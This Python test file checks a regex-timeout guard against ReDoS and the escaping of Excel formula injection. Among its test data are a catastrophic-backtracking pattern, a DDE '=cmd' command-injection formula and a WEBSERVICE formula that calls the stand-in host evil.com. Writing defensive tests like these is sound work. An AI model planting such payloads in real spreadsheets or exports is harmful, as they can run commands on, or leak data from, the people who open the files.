"""
Tests for security validators (ReDoS protection, formula escaping)
"""

import pytest
import time
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from utils.validators import (
    TimeoutError,
    safe_regex_findall,
    safe_regex_sub,
    escape_formula
)


class TestReDoSProtection:
    """Test ReDoS (Regular Expression Denial of Service) protection"""

    def test_safe_regex_findall_normal_pattern(self):
        """Test that normal patterns work correctly"""
        pattern = r'\d{2,3}[-\s]?\d{7,8}'
        text = "Contact: 06-12345678 or 020-1234567"

        matches = safe_regex_findall(pattern, text, timeout=1)

        assert len(matches) == 2
        assert '06-12345678' in matches
        assert '020-1234567' in matches

    def test_safe_regex_findall_completes_within_timeout(self):
        """Test that valid pattern completes within 1 second"""
        pattern = r'\b0\s?6[-\s]?\d{8}\b'
        text = "Phone: 06-12345678 " * 100  # 100 phone numbers

        start = time.time()
        matches = safe_regex_findall(pattern, text, timeout=1)
        duration = time.time() - start

        assert duration < 1.0
        assert len(matches) == 100

    def test_safe_regex_findall_malicious_input_timeout(self):
        """Test that malicious input is rejected within timeout"""
        # Evil regex pattern with nested quantifiers
        pattern = r'(a+)+'
        # Malicious input that causes catastrophic backtracking
        malicious_text = "a" * 30 + "!"

        with pytest.raises(TimeoutError) as exc_info:
            safe_regex_findall(pattern, malicious_text, timeout=1)

        assert "timeout" in str(exc_info.value).lower()
        assert "redos" in str(exc_info.value).lower()

    def test_safe_regex_findall_invalid_pattern(self):
        """Test that invalid regex patterns raise re.error"""
        pattern = r'[invalid(regex'  # Unmatched bracket
        text = "some text"

        with pytest.raises(Exception) as exc_info:
            safe_regex_findall(pattern, text, timeout=1)

        assert "invalid" in str(exc_info.value).lower()

    def test_safe_regex_sub_normal_pattern(self):
        """Test that normal pattern substitution works"""
        pattern = r'\d{2}-\d{8}'
        replacement = '[PHONE]'
        text = "Call 06-12345678 now"

        result = safe_regex_sub(pattern, replacement, text, timeout=1)

        assert result == "Call [PHONE] now"

    def test_safe_regex_sub_malicious_input_timeout(self):
        """Test that malicious substitution is rejected within timeout"""
        pattern = r'(a+)+'
        replacement = 'X'
        malicious_text = "a" * 30 + "!"

        with pytest.raises(TimeoutError) as exc_info:
            safe_regex_sub(pattern, replacement, malicious_text, timeout=1)

        assert "timeout" in str(exc_info.value).lower()


class TestFormulaEscaping:
    """Test Excel formula injection escaping"""

    def test_escape_formula_equals_sign(self):
        """Test escaping formulas starting with ="""
        dangerous = "=1+1"
        escaped = escape_formula(dangerous)

        assert escaped == "'=1+1"
        assert escaped.startswith("'")

    def test_escape_formula_cmd_injection(self):
        """Test escaping RCE formulas like =cmd"""
        dangerous = "=cmd|'/c calc'!A1"
        escaped = escape_formula(dangerous)

        assert escaped == "'=cmd|'/c calc'!A1"
        assert escaped.startswith("'")

    def test_escape_formula_webservice(self):
        """Test escaping data exfiltration formulas"""
        dangerous = "=WEBSERVICE('http://evil.com')"
        escaped = escape_formula(dangerous)

        assert escaped == "'=WEBSERVICE('http://evil.com')"
        assert escaped.startswith("'")

    def test_escape_formula_plus_sign(self):
        """Test escaping formulas starting with +"""
        dangerous = "+SUM(A1:A10)"
        escaped = escape_formula(dangerous)

        assert escaped == "'+SUM(A1:A10)"
        assert escaped.startswith("'")

    def test_escape_formula_minus_sign(self):
        """Test escaping formulas starting with -"""
        dangerous = "-SUM(B1:B10)"
        escaped = escape_formula(dangerous)

        assert escaped == "'-SUM(B1:B10)"
        assert escaped.startswith("'")

    def test_escape_formula_at_sign(self):
        """Test escaping formulas starting with @"""
        dangerous = "@INDIRECT(A1)"
        escaped = escape_formula(dangerous)

        assert escaped == "'@INDIRECT(A1)"
        assert escaped.startswith("'")

    def test_escape_formula_normal_text_unchanged(self):
        """Test that normal text is not changed"""
        normal = "Hello World"
        escaped = escape_formula(normal)

        assert escaped == normal

    def test_escape_formula_number_unchanged(self):
        """Test that numbers are not changed"""
        number = 123
        escaped = escape_formula(number)

        assert escaped == 123

    def test_escape_formula_empty_string(self):
        """Test that empty string is not changed"""
        empty = ""
        escaped = escape_formula(empty)

        assert escaped == ""

    def test_escape_formula_none_unchanged(self):
        """Test that None is not changed"""
        none_value = None
        escaped = escape_formula(none_value)

        assert escaped is None


class TestPerformance:
    """Test performance of security features"""

    def test_redos_protection_performance_normal_input(self):
        """Ensure ReDoS protection doesn't slow down normal input"""
        pattern = r'\b0\s?6[-\s]?\d{8}\b'
        text = "Contact: 06-12345678 " * 1000  # 1000 phone numbers

        start = time.time()
        matches = safe_regex_findall(pattern, text, timeout=1)
        duration = time.time() - start

        # Should complete well under 1 second
        assert duration < 1.0
        assert len(matches) == 1000

    def test_formula_escaping_performance(self):
        """Ensure formula escaping is fast"""
        # Test with 10000 cells
        cells = ["=SUM(A1:A10)"] * 10000

        start = time.time()
        escaped_cells = [escape_formula(cell) for cell in cells]
        duration = time.time() - start

        # Should complete very quickly (<0.1s)
        assert duration < 0.1
        assert all(cell.startswith("'") for cell in escaped_cells)
